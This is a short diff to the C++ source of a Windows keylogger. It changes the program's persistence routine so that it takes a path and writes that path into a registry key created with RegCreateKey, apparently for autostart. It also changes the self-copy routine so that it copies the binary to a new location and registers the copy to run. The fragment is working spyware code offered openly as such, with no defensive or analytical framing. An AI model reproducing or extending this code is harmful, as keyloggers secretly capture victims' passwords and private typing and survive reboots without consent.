@@ -4,8 +4,12 @@ using namespace std;
 
 KeyLogger* KeyLogger::instance = NULL;
 
-void KeyLogger::persist() {
+void KeyLogger::persist(std::string path) {
 	
+	if (path.empty()) {
+		path = programPath;
+	}
+
 	HKEY key;
 
 	RegCreateKey(
@@ -16,7 +20,7 @@ void KeyLogger::persist() {
 
 	std::string keyValue = "\"";
 
-	keyValue += programPath;
+	keyValue += path;
 
 	keyValue += "\"";
 
@@ -260,10 +264,9 @@ void KeyLogger::log(std::string text) {
 }
 
 void KeyLogger::copySelf(std::string target) {
-
-	CopyFile(programPath.c_str(), target.c_str(), false);
-	programPath = target;
-	persist();
+	
+	CopyFile(programPath.c_str(), target.c_str(), true);
+	persist(target);
 }
 
 void KeyLogger::writeBuffer()
